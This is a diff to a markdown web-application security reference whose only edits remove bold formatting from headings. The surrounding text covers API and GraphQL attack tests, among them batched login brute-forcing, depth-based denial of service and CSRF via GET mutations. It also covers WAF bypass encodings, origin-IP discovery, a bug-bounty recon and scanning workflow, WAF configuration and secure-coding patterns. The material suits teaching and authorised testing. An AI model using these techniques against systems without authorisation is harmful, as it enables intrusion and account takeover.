@@ -1091,14 +1091,14 @@ GET /api/v1/orders/1002   other user (should return 403, not data)
 # 3. Replay all requests; flag 200 responses as potential BOLA
 ```
 
-**API2 Broken Authentication**
+API2 Broken Authentication
 ```bash
 # Test: remove Authorization header from authenticated requests
 # Check OPTIONS/HEAD methods for auth bypass
 curl -X OPTIONS https://api.target.com/v1/admin/users
 ```
 
-**API3 Broken Object Property Level Authorization (BOPLA)**
+API3 Broken Object Property Level Authorization (BOPLA)
 ```python
 r = requests.put("/api/users/1", json={
     "name": "test",
@@ -1108,7 +1108,7 @@ r = requests.put("/api/users/1", json={
 # If unexpected fields are reflected or acted on -> BOPLA
 ```
 
-**API4 Unrestricted Resource Consumption**
+API4 Unrestricted Resource Consumption
 ```bash
 # GraphQL batching to bypass per-request rate limits
 curl -X POST https://api.target.com/graphql \
@@ -1116,7 +1116,7 @@ curl -X POST https://api.target.com/graphql \
   -d '[{"query":"{ user(id:1){email} }"},{"query":"{ user(id:2){email} }"}]'
 ```
 
-**API5 Broken Function Level Authorization**
+API5 Broken Function Level Authorization
 ```bash
 GET  /api/v1/admin/users
 GET  /api/admin/users
@@ -1125,12 +1125,12 @@ DELETE /api/v1/users/123
 PUT  /api/v1/users/123  # test if allowed for regular users
 ```
 
-**API6 Unrestricted Access to Sensitive Business Flows**
+API6 Unrestricted Access to Sensitive Business Flows
 - Account creation: create bulk accounts (bot detection bypass)
 - Purchasing: buy limited-quantity items faster than intended
 - Content posting: spam via API without UI rate limiting
 
-**API8 Security Misconfiguration**
+API8 Security Misconfiguration
 ```bash
 # Check CORS on API
 curl -H "Origin: https://attacker.com" https://api.target.com/v1/user/me -I
@@ -1142,7 +1142,7 @@ GET /api/v1/swagger.json
 GET /api/v1/openapi.json
 ```
 
-**API9 Improper Inventory Management**
+API9 Improper Inventory Management
 ```bash
 # Enumerate API versions; older versions may lack security controls
 curl https://api.target.com/v1/users
@@ -1151,7 +1151,7 @@ curl https://api.target.com/beta/users
 curl https://api.target.com/internal/users
 ```
 
-**API10 Unsafe Consumption of APIs**
+API10 Unsafe Consumption of APIs
 - Server trusts third-party API responses without validation
 - Test: if you can influence third-party data (e.g., OAuth profile), inject payloads there
 
@@ -1159,7 +1159,7 @@ curl https://api.target.com/internal/users
 
 ### GraphQL Security Testing
 
-**Introspection Query (disable in production)**
+Introspection Query (disable in production)
 ```graphql
 {
   __schema {
@@ -1171,13 +1171,13 @@ curl https://api.target.com/internal/users
 }
 ```
 
-**Field Suggestion Abuse (schema disclosure without introspection)**
+Field Suggestion Abuse (schema disclosure without introspection)
 ```graphql
 { usr { id } }
 # Response: "Did you mean 'user'?" reveals schema
 ```
 
-**Batching Attack (rate limit bypass)**
+Batching Attack (rate limit bypass)
 ```graphql
 {
   login1: login(username: "admin", password: "pass1") { token }
@@ -1186,7 +1186,7 @@ curl https://api.target.com/internal/users
 }
 ```
 
-**Array-based batching**
+Array-based batching
 ```json
 [
   {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
@@ -1194,18 +1194,18 @@ curl https://api.target.com/internal/users
 ]
 ```
 
-**CSRF via GET Mutations**
+CSRF via GET Mutations
 ```
 If mutations are allowed via GET:
 https://api.target.com/graphql?query=mutation{deleteAccount(id:123)}
 ```
 
-**Depth Limit Bypass (DoS potential)**
+Depth Limit Bypass (DoS potential)
 ```graphql
 { user { friends { friends { friends { friends { id name } } } } } }
 ```
 
-**GraphQL Tools**
+GraphQL Tools
 ```bash
 # InQL Burp extension: automated introspection and testing
 # GraphQL Voyager: visual schema exploration
@@ -1221,12 +1221,12 @@ curl -X POST https://api.target.com/graphql \
 
 ### WAF Deployment Models
 
-**Inline Reverse Proxy**
+Inline Reverse Proxy
 - All traffic routed through WAF before reaching origin; can block malicious requests in real-time
 - Cloud WAFs: AWS WAF (CloudFront/ALB/API Gateway), Cloudflare WAF, Imperva, Akamai App and API Protector
 - On-premises: ModSecurity (Apache/Nginx/IIS), NAXSI (Nginx)
 
-**Out-of-Band Passive**
+Out-of-Band Passive
 - Monitors copy of traffic; cannot block in real-time
 - Used for detection, logging, compliance; lower performance impact
 
@@ -1234,7 +1234,7 @@ curl -X POST https://api.target.com/graphql \
 
 ### ModSecurity CRS Configuration
 
-**Basic Setup**
+Basic Setup
 ```apache
 SecRuleEngine On
 
@@ -1252,7 +1252,7 @@ SecAction "id:900110,phase:1,pass,nolog,setvar:tx.inbound_anomaly_score_threshol
 SecAction "id:900110,phase:1,pass,nolog,setvar:tx.outbound_anomaly_score_threshold=4"
 ```
 
-**Exclusion Rules (Tuning)**
+Exclusion Rules (Tuning)
 ```apache
 # Exclude specific rule for a URL path
 SecRule REQUEST_URI "@beginsWith /api/legacy-endpoint" \
@@ -1266,7 +1266,7 @@ SecRule REMOTE_ADDR "@ipMatch 10.0.0.0/8" \
     "id:10002,phase:1,pass,nolog,ctl:ruleEngine=Off"
 ```
 
-**Testing with go-ftw**
+Testing with go-ftw
 ```bash
 pip install ftw
 go-ftw run -d /path/to/CRS/tests/regression/
@@ -1276,7 +1276,7 @@ go-ftw run -d /path/to/CRS/tests/regression/
 
 ### AWS WAF v2
 
-**Key Managed Rule Groups**
+Key Managed Rule Groups
 | Rule Group | Protects Against |
 |-----------|-----------------|
 | `AWSManagedRulesCommonRuleSet` | OWASP Top 10 common attacks |
@@ -1285,7 +1285,7 @@ go-ftw run -d /path/to/CRS/tests/regression/
 | `AWSManagedRulesBotControlRuleSet` | Automated bots, scrapers |
 | `AWSManagedRulesATPRuleSet` | Account takeover (credential stuffing) |
 
-**Rate-Based Rule (JSON)**
+Rate-Based Rule (JSON)
 ```json
 {
   "Name": "RateLimit-Login",
@@ -1308,7 +1308,7 @@ go-ftw run -d /path/to/CRS/tests/regression/
 }
 ```
 
-**WAF Logging**
+WAF Logging
 ```bash
 # Enable logging to CloudWatch Logs
 aws wafv2 put-logging-configuration \
@@ -1325,13 +1325,13 @@ fields @timestamp, httpRequest.uri, action, ruleGroupList.0.terminatingRule.rule
 
 ### Cloudflare WAF
 
-**Configuration Layers**
+Configuration Layers
 - Managed Rulesets: OWASP Core Ruleset, Cloudflare Managed Ruleset
 - Custom Rules: expression-based filtering (Firewall Rules language)
 - Rate Limiting: per-IP, per-ASN, per-cookie, per-header
 - Bot Management: JS challenge, Managed Challenge, Block based on bot score
 
-**Custom Rule Expressions**
+Custom Rule Expressions
 ```
 Block requests without User-Agent:
   (not http.request.headers["user-agent"] exists)
@@ -1347,13 +1347,13 @@ Challenge traffic from specific ASNs:
 
 ### WAF Testing and Bypass (Authorized Testing Only)
 
-**WAF Detection**
+WAF Detection
 ```bash
 wafw00f https://target.com
 wafw00f https://target.com -a  # test all WAF signatures
 ```
 
-**Bypass Techniques for Authorized Testing**
+Bypass Techniques for Authorized Testing
 ```
 Encoding bypasses:
   %27           URL encode apostrophe
@@ -1379,13 +1379,13 @@ Chunked Transfer-Encoding:
 
 ### CDN Security
 
-**Security Benefits**
+Security Benefits
 - HTTPS enforcement: redirect HTTP to HTTPS at edge
 - DDoS protection: absorb volumetric attacks at anycast network
 - Origin IP protection: validate traffic source is CDN; never expose origin IP directly
 - Geo-blocking: restrict access by country/region at edge
 
-**Origin IP Leakage Checks**
+Origin IP Leakage Checks
 ```bash
 # Check historical DNS records via Shodan, censys.io, SecurityTrails
 shodan search "Ssl.cert.subject.cn:target.com"
@@ -1399,7 +1399,7 @@ curl -k --resolve target.com:443:<direct_ip> https://target.com/
 
 ### Secure Coding by Language
 
-**Python Security Patterns**
+Python Security Patterns
 ```python
 import secrets, hashlib, subprocess, psycopg2
 
@@ -1433,7 +1433,7 @@ salt = secrets.token_bytes(32)
 hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)
 ```
 
-**Java Security Patterns**
+Java Security Patterns
 ```java
 // PreparedStatement prevents SQL injection
 public User getUser(Connection conn, String username) throws SQLException {
@@ -1461,7 +1461,7 @@ String hashed = encoder.encode(password);
 boolean matches = encoder.matches(rawPassword, hashed);
 ```
 
-**Node.js Security Patterns**
+Node.js Security Patterns
 ```javascript
 const express = require('express');
 const helmet = require('helmet');
@@ -1503,7 +1503,7 @@ const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, {
 });
 ```
 
-**PHP Security Patterns**
+PHP Security Patterns
 ```php
 // PDO prepared statements
 function getUser(PDO $pdo, string $username): ?array {
@@ -1530,7 +1530,7 @@ echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
 
 ### Security Code Review Checklist
 
-**Injection Sinks to Search For**
+Injection Sinks to Search For
 ```bash
 # Python SQL sinks
 grep -rn "execute\|query\|prepare\|fetchall\|raw(" --include="*.py"
@@ -1552,7 +1552,7 @@ grep -rn "shell_exec\|exec\|system\|passthru\|popen" --include="*.php"
 grep -rn "unserialize(" --include="*.php"
 ```
 
-**Security Review Checklist**
+Security Review Checklist
 - [ ] All database queries use parameterized statements (no string concatenation)
 - [ ] Output HTML-encoded before rendering in templates
 - [ ] Every protected endpoint has authentication and authorization check
@@ -1568,21 +1568,21 @@ grep -rn "unserialize(" --include="*.php"
 
 ### Threat Modeling for Applications
 
-**Data Flow Diagram Process**
+Data Flow Diagram Process
 1. Identify external entities (users, third-party APIs, admin interfaces)
 2. Map data flows between components
 3. Identify trust boundaries (internet to DMZ to internal, user to app to database)
 4. Apply STRIDE to each component and data flow
 5. Rate risks: OWASP Risk Rating = Likelihood x Impact
 
-**OWASP ASVS Verification Framework**
+OWASP ASVS Verification Framework
 | Level | Use Case |
 |-------|---------|
 | L1 (Opportunistic) | All software; automated testing sufficient |
 | L2 (Standard) | Applications handling sensitive data; most commercial apps |
 | L3 (Advanced) | High-value: banking, medical, critical infrastructure |
 
-**Key ASVS Authentication Requirements**
+Key ASVS Authentication Requirements
 - V2.1.1: Passwords minimum 12 characters
 - V2.1.5: Users can change their password
 - V2.1.9: No password composition rules that reduce entropy
@@ -1594,7 +1594,7 @@ grep -rn "unserialize(" --include="*.php"
 
 ### Bug Bounty Methodology Full Workflow
 
-**Phase 1 Asset Discovery**
+Phase 1 Asset Discovery
 ```bash
 # Subdomain enumeration (passive + active)
 subfinder -d target.com -all -o subs_subfinder.txt
@@ -1611,7 +1611,7 @@ cat subs_*.txt | sort -u | httpx -status-code -title -tech-detect \
     -follow-redirects -o live_hosts.txt -threads 50
 ```
 
-**Phase 2 URL and Content Discovery**
+Phase 2 URL and Content Discovery
 ```bash
 # Historical URL collection
 cat live_hosts.txt | waybackurls | tee wayback_urls.txt
@@ -1632,7 +1632,7 @@ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
 arjun -u https://target.com/api/endpoint -m GET
 ```
 
-**Phase 3 Automated Vulnerability Scanning**
+Phase 3 Automated Vulnerability Scanning
 ```bash
 # Nuclei CVE and misconfiguration scanning
 nuclei -l live_hosts.txt -t cves/ -t exposures/ -t misconfigurations/ \
@@ -1651,7 +1651,7 @@ testssl.sh --full --jsonfile testssl_results.json https://target.com
 curl -s "https://http-observatory.security.mozilla.org/api/v1/analyze?host=target.com" | jq .
 ```
 
-**Phase 4 JavaScript Analysis**
+Phase 4 JavaScript Analysis
 ```bash
 # Extract endpoints and secrets from JS files
 cat js_files.txt | while read url; do
@@ -1664,7 +1664,7 @@ grep -rE "(api[_-]?key|apikey|api_secret|aws_access|private_key|token|secret)" \
     js_files_dir/ --include="*.js" -l
 ```
 
-**Phase 5 Manual Deep Testing**
+Phase 5 Manual Deep Testing
 - IDOR testing on all object references
 - Authentication and session security testing
 - Input validation on all parameters (injection, XSS)
@@ -1676,7 +1676,7 @@ grep -rE "(api[_-]?key|apikey|api_secret|aws_access|private_key|token|secret)" \
 
 ### Complete Tool Reference
 
-**Reconnaissance**
+Reconnaissance
 | Tool | Command | Purpose |
 |------|---------|---------|
 | amass | `amass enum -d target.com` | Subdomain enumeration |
@@ -1687,7 +1687,7 @@ grep -rE "(api[_-]?key|apikey|api_secret|aws_access|private_key|token|secret)" \
 | shodan | `shodan search hostname:target.com` | Internet-wide scanning |
 | crt.sh | `curl crt.sh/?q=%.target.com&output=json` | CT log search |
 
-**Scanning**
+Scanning
 | Tool | Command | Purpose |
 |------|---------|---------|
 | nuclei | `nuclei -u target -t cves/ -t exposures/` | Template-based scanning |
@@ -1696,7 +1696,7 @@ grep -rE "(api[_-]?key|apikey|api_secret|aws_access|private_key|token|secret)" \
 | nmap | `nmap -sV -sC -p- target.com` | Port/service scanning |
 | feroxbuster | `feroxbuster -u https://target.com -w wordlist.txt` | Content discovery |
 
-**Fuzzing**
+Fuzzing
 ```bash
 # Directory and file discovery
 ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt \
@@ -1715,7 +1715,7 @@ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
      -u https://target.com -H "Host: FUZZ.target.com" -fs <baseline>
 ```
 
-**Exploitation Tools**
+Exploitation Tools
 | Tool | Use Case |
 |------|---------|
 | Burp Suite Pro | Full web app pentest platform |
@@ -1747,7 +1747,7 @@ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
 
 ### Practice Labs and Learning Resources
 
-**Intentionally Vulnerable Applications**
+Intentionally Vulnerable Applications
 ```bash
 # OWASP Juice Shop (Docker)
 docker run --rm -p 3000:3000 bkimminich/juice-shop
@@ -1763,7 +1763,7 @@ docker run --rm -p 8080:8080 webgoat/goat-and-wolf
 # TryHackMe Web Fundamentals path: https://tryhackme.com
 ```
 
-**Essential Resources**
+Essential Resources
 ```
 PortSwigger Web Security Academy (free):
   https://portswigger.net/web-security
